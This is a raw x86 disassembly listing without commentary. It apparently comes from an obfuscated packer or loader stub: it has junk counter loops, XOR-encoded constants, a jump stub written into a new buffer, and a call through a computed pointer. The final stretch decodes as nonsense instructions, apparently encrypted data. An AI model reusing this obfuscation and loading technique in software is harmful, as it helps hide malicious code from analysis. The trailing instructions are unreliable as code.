  40e74e:	and    DWORD PTR ds:0x434753,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x434753
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x434753,edi
  40e76a:	cmp    DWORD PTR ds:0x434753,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x434753,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x43466b
  40e789:	push   0x6202
  40e78e:	push   0x434808
  40e793:	push   0x4348f1
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x434753,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x434753
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x434753,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x4346fb,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x4346fb
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x4346fb,edi
  40e7d9:	cmp    DWORD PTR ds:0x4346fb,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x4346fb,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43499f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x4346bb,0x17
  40e815:	cmp    DWORD PTR ds:0x4346bb,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x4346bb,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x4346bb
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x4346bb,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43470b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x43473f,0x434687
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x434673
  40e870:	and    ecx,DWORD PTR ds:0x43474f
  40e876:	mov    DWORD PTR ds:0x434673,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x4346c7,0x13
  40e889:	cmp    DWORD PTR ds:0x4346c7,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x4346c7,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x4346c7,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x4346c7
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x4346c7,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x4346c7
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x4346c7,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x4346fb,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x4346fb
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x4346fb,edi
  40e900:	cmp    DWORD PTR ds:0x4346fb,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x4346fb,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x434873
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x4346fb,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x4346fb
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x4346fb,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x4346bf,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434707
  40e958:	adc    DWORD PTR ds:0x434737,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43469b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x4346d7
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x434733
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x43467f,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x4346c7,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x43467b
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x43467b,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x434777
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x434747
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x43477f,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434783,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x434677,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x4346c7,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x43473f,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x4346c7,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x43473b
  40ea3e:	sub    DWORD PTR ds:0x43473f,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43470f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434683,0x434743
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43470b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434683,0x4346cf
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x43473f,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x4346bf,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x43466f,0x434683
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434683
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434713
  40eac7:	and    DWORD PTR ds:0x4346c3,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43478f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x4346bf,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x4346bf
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x4346bf,ecx
  40eb04:	cmp    DWORD PTR ds:0x4346bf,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x4346bf,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x4346bf,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x4346bf
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x4346bf,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x4346c7
  40eb55:	sbb    edx,DWORD PTR ds:0x434787
  40eb5b:	mov    DWORD PTR ds:0x4346c7,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43478b
  40eb6a:	or     DWORD PTR ds:0x43473b,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x4346b7
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43478f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43478b,0x434747
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x4346cf,0x434687
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x43473f,0x43477b
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x434677,0x4346f7
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x434663,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434703,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x4346bb,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x4346c3,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434793,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x4346fb,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434783,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x434667,0x43470f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434713,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434713
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434713,eax
  40ec60:	cmp    DWORD PTR ds:0x434713,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434713,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434713
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434713,eax
  40ec91:	cmp    DWORD PTR ds:0x434713,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x434663
  40eca5:	adc    eax,DWORD PTR ds:0x4346fb
  40ecab:	mov    ds:0x434663,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x4346bf,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x434777,0x434683
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x4346fb
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x4346b7,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x43477b
  40ecfd:	or     DWORD PTR ds:0x434793,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x4346c3,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x4346f7,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x434753,0x4346b7
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x434777,0x43467f
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x4346b7,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434687,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x4346bf,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434687,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x43477f,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434787,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x434747,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x434747
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x434747,ecx
  40edb2:	cmp    DWORD PTR ds:0x434747,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x4349db
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x434747,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x4346cf,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x434743,0x434777
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x43467f,0x43466f
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x4346bb,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x43466f
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x43467f,0x13
  40ee32:	cmp    DWORD PTR ds:0x43467f,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x43467f,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x4349db
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x43467f
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x43467f,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
  40f0bf:	mov    eax,ds:0x414afe
  40f0c4:	push   0x4
  40f0c6:	add    eax,0x1cc
  40f0cb:	push   eax
  40f0cc:	lea    eax,[ebp-0x1c]
  40f0cf:	push   eax
  40f0d0:	call   0x4028d7
  40f0d5:	mov    eax,DWORD PTR [ebp-0x1c]
  40f0d8:	mov    eax,DWORD PTR [ebp-0x4]
  40f0db:	mov    eax,DWORD PTR [ebp-0x24]
  40f0de:	mov    DWORD PTR [ebp+0xc],eax
  40f0e1:	mov    eax,ds:0x414b82
  40f0e6:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0e9:	sub    eax,edi
  40f0eb:	xor    eax,esi
  40f0ed:	cmp    eax,ecx
  40f0ef:	je     0x40f136
  40f0f5:	mov    eax,ds:0x414b7a
  40f0fa:	mov    ecx,DWORD PTR [ebp+0xc]
  40f0fd:	sub    eax,edi
  40f0ff:	xor    eax,esi
  40f101:	cmp    eax,ecx
  40f103:	jne    0x40f119
  40f109:	mov    eax,ds:0x414b82
  40f10e:	add    eax,DWORD PTR ds:0x414b7a
  40f114:	jmp    0x40f120
  40f119:	mov    eax,DWORD PTR [ebp+0xc]
  40f11c:	xor    eax,esi
  40f11e:	add    eax,edi
  40f120:	mov    ds:0x414b7a,eax
  40f125:	mov    eax,DWORD PTR [ebp+0xc]
  40f128:	xor    eax,esi
  40f12a:	add    eax,edi
  40f12c:	mov    ds:0x414b82,eax
  40f131:	jmp    0x40f140
  40f136:	mov    eax,ds:0x414b82
  40f13b:	mov    ds:0x414b7a,eax
  40f140:	mov    eax,DWORD PTR [ebp-0x58]
  40f143:	mov    ecx,DWORD PTR ds:0x414b7a
  40f149:	add    DWORD PTR [eax],ecx
  40f14b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f14e:	mov    eax,DWORD PTR [eax]
  40f150:	pop    edi
  40f151:	pop    esi
  40f152:	pop    ebx
  40f153:	leave  
  40f154:	ret    0xc
  40f157:	push   ebp
  40f158:	mov    ebp,esp
  40f15a:	jmp    0x40f4ed
  40f15f:	repz call 0x655e557a
  40f165:	jae    0x40f1d8
  40f167:	hlt    
  40f168:	aaa    
  40f169:	scas   eax,DWORD PTR es:[edi]
  40f16a:	aad    0x2c
  40f16c:	adc    BYTE PTR [eax],dh
  40f16e:	and    BYTE PTR [bp+0x7e7e],dh
  40f173:	hlt    
  40f174:	jns    0x40f1f4
  40f176:	jle    0x40f1d3
  40f178:	imul   edi,ebx,0xffffffeb
  40f17b:	push   eax
  40f17c:	loope  0x40f188
  40f17e:	push   0xffffffd6
  40f180:	icebp  
  40f181:	mov    esi,0xf730b0bd
  40f186:	pop    edi
  40f187:	mov    cl,0x69
  40f189:	mov    edi,0x62c3c37
  40f18e:	jne    0x40f124
  40f190:	cld    
  40f191:	les    ebp,FWORD PTR [esi+eax*2]
  40f194:	mov    ah,0xbe
  40f196:	mov    ds,WORD PTR [ebp-0x4a3bb972]
  40f19c:	mov    esi,0xd0504484
  40f1a1:	xchg   ebx,eax
  40f1a2:	sbb    al,ch
  40f1a4:	pop    ebx
  40f1a5:	lods   eax,DWORD PTR ds:[esi]
  40f1a6:	mov    ah,0x6b
  40f1a8:	add    DWORD PTR [ecx+0x3f],0xffffffef
  40f1ac:	shl    DWORD PTR [ebx-0x51],0xd4
  40f1b0:	test   eax,0xf11b9100
  40f1b5:	xor    bh,BYTE PTR [ebp+0x130a61d1]
  40f1bb:	or     BYTE PTR [edi],dl
  40f1bd:	mov    dl,0x1b
  40f1bf:	add    bl,BYTE PTR [eax]
  40f1c1:	sbb    bl,bl
  40f1c3:	sub    ebp,edx
  40f1c5:	and    edx,DWORD PTR [ebp+0x18]
  40f1c8:	call   0xb22f:0x4d287e3f
  40f1cf:	dec    edi
  40f1d0:	mov    dh,0xeb
  40f1d2:	arpl   WORD PTR [eax-0x53],dx
  40f1d5:	inc    ecx
